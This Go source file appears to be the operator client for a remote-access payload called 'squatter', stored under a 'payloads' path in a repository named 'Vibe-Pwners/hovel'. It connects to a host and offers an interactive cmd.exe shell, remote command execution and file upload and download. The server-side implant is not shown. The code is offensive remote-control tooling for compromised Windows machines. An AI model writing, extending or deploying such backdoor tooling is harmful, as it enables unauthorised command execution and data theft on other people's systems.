// Command squatterctl is the client/shell for the squatter mux server.
//
// At the prompt you invoke a module by name (e.g. "echo a b") and talk to it
// directly; bare cmd opens an interactive cmd.exe stream, cmd <command...>
// runs through cmd.exe /c, and getfile/putfile stream files of any size through
// a fixed buffer.
//
//	squatterctl [host] [port]           # the shell (default)
//	squatterctl --demo [host] [port]    # scripted echo walkthrough
//	squatterctl --streams N [host] [port]
package main

import (
	"fmt"
	"net"
	"os"

	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
)

func main() {
	opts := shell.ParseCLI(os.Args[1:])
	conn, err := net.Dial("tcp", net.JoinHostPort(opts.Host, opts.Port))
	if err != nil {
		fmt.Fprintln(os.Stderr, "connect:", err)
		os.Exit(1)
	}
	defer conn.Close()

	client := shell.New(conn)
	switch opts.Mode {
	case shell.ModeDemo:
		client.RunDemo(os.Stdout)
	case shell.ModeStreams:
		client.RunStreams(os.Stdout, opts.Streams)
	default:
		client.RunPrompt(net.JoinHostPort(opts.Host, opts.Port))
	}
}
